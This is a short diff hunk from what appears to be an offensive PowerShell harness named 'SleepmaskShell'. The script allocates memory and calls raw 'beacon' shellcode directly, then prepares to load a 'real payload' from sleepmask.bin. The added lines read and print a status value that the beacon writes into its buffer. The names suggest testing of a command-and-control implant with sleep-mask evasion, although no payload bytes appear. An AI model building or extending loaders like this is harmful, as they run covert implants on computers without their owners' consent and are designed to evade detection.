@@ -185,6 +185,8 @@ public static class SleepmaskShell {
   $bmem = [SleepmaskShell]::Alloc($b)
   [SleepmaskShell]::Call($bmem)
   Write-Host "  [powershell] beacon ($($b.Length) B) returned cleanly (shellcode path OK)"
+  $cs = [uint64][SleepmaskShell]::ReadQ($bmem, $b.Length - 8)
+  Write-Host "  [powershell] beacon create_status = $("{0:X16}" -f $cs)   (0x0 = STATUS_SUCCESS, 0xFFFFFFFFFFFFFFFF = not attempted)"
 
   # --- [2] the REAL payload --------------------------------------------------
   if (Test-Path (Join-Path $PSScriptRoot "sleepmask.bin")) {
